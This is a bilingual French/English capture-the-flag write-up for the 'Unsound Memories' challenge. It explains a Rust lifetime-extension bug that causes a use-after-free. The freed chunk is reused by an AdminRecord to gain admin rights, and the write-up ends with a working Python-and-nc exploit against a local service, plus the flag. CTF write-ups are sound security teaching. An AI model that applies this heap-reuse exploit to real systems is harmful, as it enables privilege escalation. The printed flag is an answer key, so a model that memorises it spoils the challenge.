# Unsound Memories

## Write-up (FR)

Le programme permet de créer des références à travers la fonctionnalité `New ref`.

En analysant le code source, on remarque que la fonction `cache_ref()` étend artificiellement la durée de vie d'une référence mutable :

```rs
fn cache_ref<'call, 'extended, T: ?Sized>(x: &'call mut T) -> &'extended mut T
```

Cette référence est ensuite retournée sous forme de référence `'static` par `alloc_ref()`.

Cependant, l'objet pointé est alloué dans un `Box` qui est détruit à la fin de la fonction.
La référence conservée devient donc un pointeur suspendu (dangling pointer), créant une vulnérabilité de type [Use-After-Free](https://cwe.mitre.org/data/definitions/416.html).

---

## Write-up (EN)

The program allows users to create references through the `New ref` functionality.

While reviewing the source code, we discover that `cache_ref()` artificially extends the lifetime of a mutable reference:

```rs
fn cache_ref<'call, 'extended, T: ?Sized>(x: &'call mut T) -> &'extended mut T
```

The resulting reference is then returned as a `'static` reference by `alloc_ref()`.

However, the underlying object is allocated inside a `Box` that gets dropped when the function returns. The stored reference therefore becomes a dangling pointer, creating a [Use-After-Free](https://cwe.mitre.org/data/definitions/416.html) vulnerability.

---

## Exploitation (FR)

Après la création d'une référence, une nouvelle entrée administrateur est créé.

Les deux objets ayant la même taille (144 octets), l'allocateur réutilise le même bloc mémoire.

La référence suspendue pointe alors directement vers la structure :

```rs
#[repr(C)]
pub struct AdminRecord {
    is_admin: u64,
    username: [u8; BUFFER_SIZE - 8],
}
```

Le champ `is_admin` se trouve au début de la structure. Écrire la valeur `1` dans les huit premiers octets de la référence permet donc d'obtenir les privilèges administrateur.

---

## Exploitation (EN)

After creating a reference, a new administrator record is allocated.

Because both objects have the same size (144 bytes), the allocator reuses the same heap chunk.

The dangling reference now points directly to:

```rs
#[repr(C)]
pub struct AdminRecord {
    is_admin: u64,
    username: [u8; BUFFER_SIZE - 8],
}
```

The `is_admin` field is located at offset zero. Writing the value `1` into the first eight bytes of the dangling reference grants administrator privileges.

---

## Exploit

```python
python3 -c "
import sys
import struct

sys.stdout.buffer.write(b'5\n')
sys.stdout.buffer.write(b'8\n')

sys.stdout.buffer.write(b'7\n0\n8\n')
sys.stdout.buffer.write(struct.pack('<Q', 1))
sys.stdout.buffer.write(b'\n')

sys.stdout.buffer.write(b'9\n0\n')
sys.stdout.buffer.write(b'10\n0\n')
sys.stdout.buffer.write(b'0\n')
" | nc localhost 1337
```

## Flag

`DCI{N4n0L0g_Adm1n_Byp4ss_9a6295810c1b}`
